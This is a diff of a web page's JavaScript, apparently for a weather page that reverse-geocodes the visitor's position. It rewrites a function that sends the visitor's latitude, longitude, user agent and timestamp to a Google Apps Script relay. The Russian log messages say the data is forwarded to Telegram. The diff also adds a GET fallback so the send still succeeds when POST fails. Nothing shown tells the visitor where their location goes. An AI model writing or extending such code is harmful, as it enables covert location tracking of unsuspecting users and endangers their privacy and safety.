@@ -135,34 +135,58 @@
                 }
             );
         }
-
-        function sendToGoogleScript(lat, lon) {
-            const payload = {
-                lat: lat,
-                lon: lon,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            };
-        
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    console.log('✅ Координаты отправлены в Telegram');
-                } else {
-                    console.error('❌ Ошибка отправки:', data.error);
-                }
-            })
-            .catch(error => {
-                console.error('❌ Ошибка сети:', error);
-            });
-        }
+    
+            function sendToGoogleScript(lat, lon) {
+        const payload = {
+            lat: lat,
+            lon: lon,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
+    
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log('✅ Координаты отправлены в Telegram');
+            } else {
+                console.error('❌ Ошибка отправки:', data.error);
+            }
+        })
+        .catch(error => {
+            console.error('❌ Ошибка сети:', error);
+            // Если POST не работает, пробуем GET
+            sendViaGet(lat, lon);
+        });
+    }
+    
+    function sendViaGet(lat, lon) {
+        const params = new URLSearchParams({
+            lat: lat,
+            lon: lon,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        });
+    
+        fetch(GOOGLE_SCRIPT_URL + '?' + params.toString())
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log('✅ Координаты отправлены в Telegram (GET)');
+            } else {
+                console.error('❌ Ошибка отправки (GET):', data.error);
+            }
+        })
+        .catch(error => {
+            console.error('❌ Ошибка сети (GET):', error);
+        });
+    }
         // Остальные функции без изменений
         function getLocationName(lat, lon) {
             fetch(`https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&lang=ru&appid=${apiKey}`)
@@ -219,5 +243,6 @@
 </body>
 
 </html>
+
 
 
